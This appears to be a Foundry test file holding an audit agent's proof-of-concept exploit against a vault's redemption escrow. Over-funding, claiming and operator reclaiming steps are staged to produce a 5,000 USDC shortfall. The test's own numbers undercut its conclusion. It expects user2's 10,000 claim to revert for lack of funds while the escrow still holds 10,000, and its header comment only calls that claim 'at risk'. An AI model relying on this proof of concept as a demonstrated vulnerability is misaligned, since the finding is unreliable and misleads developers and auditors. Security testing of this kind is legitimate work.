// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys protocol. user1 and user2 deposit 10,000 USDC each, receiving USDM.
// 2. [T=0] user1 requests redemption of 10,000 USDM. RedeemEscrow.totalOwed becomes 10,000. Escrow balance is 0.
// 3. [T=1] user2 requests redemption of 10,000 USDM. RedeemEscrow.totalOwed becomes 20,000. Escrow balance is 0.
// 4. [T=2] Operator calls fundRedemptions(30,000). Escrow balance becomes 30,000. Excess = 10,000.
// 5. [T=3] user1 calls claimRedeem. Receives 10,000 USDC. Escrow balance drops to 20,000. totalOwed drops to 10,000.
// 6. [T=4] Operator calls reclaimFromRedeemEscrow(10,000). Check: bal(20,000) >= amount(10,000) + totalOwed(10,000). Passes!
// 7. [T=5] Escrow balance drops to 10,000. totalOwed is 10,000.
// 8. [T=6] user3 requests redemption of 5,000 USDM. totalOwed becomes 15,000. Escrow balance is 10,000.
// 9. [Assert] Escrow is underfunded. shortfall() == 5,000. user2's claim is now at risk of failing if operator doesn't re-fund.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // Step 1: Setup deposits for user1 and user2
        _depositAs(user1, 10_000e6);
        _depositAs(user2, 10_000e6);

        uint256 user1BalBefore = usdc.balanceOf(user1);
        uint256 user2BalBefore = usdc.balanceOf(user2);

        // Step 2: user1 requests redemption
        vm.startPrank(user1);
        usdm.approve(address(vault), 10_000e6);
        uint256 reqId1 = vault.requestRedeem(10_000e6);
        vm.stopPrank();

        assertEq(redeemEscrow.totalOwed(), 10_000e6, "totalOwed should be 10k after user1 request");

        // Step 3: user2 requests redemption
        vm.startPrank(user2);
        usdm.approve(address(vault), 10_000e6);
        uint256 reqId2 = vault.requestRedeem(10_000e6);
        vm.stopPrank();

        assertEq(redeemEscrow.totalOwed(), 20_000e6, "totalOwed should be 20k after user2 request");

        // Step 4: Operator over-funds the escrow (Phantom Surplus creation)
        vm.prank(operator);
        vault.fundRedemptions(30_000e6);

        assertEq(redeemEscrow.balance(), 30_000e6, "Escrow balance should be 30k");

        // Step 5: user1 claims redemption
        vm.warp(block.timestamp + 3 days); // Cooldown period
        vm.prank(user1);
        vault.claimRedeem(reqId1);

        assertEq(usdc.balanceOf(user1), user1BalBefore + 10_000e6, "user1 should receive 10k USDC");
        assertEq(redeemEscrow.balance(), 20_000e6, "Escrow balance should drop to 20k");
        assertEq(redeemEscrow.totalOwed(), 10_000e6, "totalOwed should drop to 10k");

        // Step 6: Operator reclaims the "excess" from the escrow
        vm.prank(operator);
        vault.reclaimFromRedeemEscrow(10_000e6);

        assertEq(redeemEscrow.balance(), 10_000e6, "Escrow balance should drop to 10k after reclaim");
        assertEq(redeemEscrow.totalOwed(), 10_000e6, "totalOwed remains 10k for user2");

        // Step 7: A new user (user3) requests redemption, creating an imminent claim
        _depositAs(user3, 5_000e6);
        vm.startPrank(user3);
        usdm.approve(address(vault), 5_000e6);
        uint256 reqId3 = vault.requestRedeem(5_000e6);
        vm.stopPrank();

        assertEq(redeemEscrow.totalOwed(), 15_000e6, "totalOwed should be 15k after user3 request");

        // Step 8: Assert the exploit - Escrow is now underfunded for pending claims
        uint256 escrowBal = redeemEscrow.balance();
        uint256 totalOwed = redeemEscrow.totalOwed();

        assertLt(escrowBal, totalOwed, "Escrow balance must be less than totalOwed (underfunded)");
        assertEq(totalOwed - escrowBal, 5_000e6, "Shortfall should be exactly 5k");

        // Prove that user2's claim will fail due to lack of funds (DoS / Liquidity Crisis)
        vm.warp(block.timestamp + 3 days);
        vm.prank(user2);
        vm.expectRevert(); // Reverts because escrow doesn't have 10k USDC
        vault.claimRedeem(reqId2);
    }
}
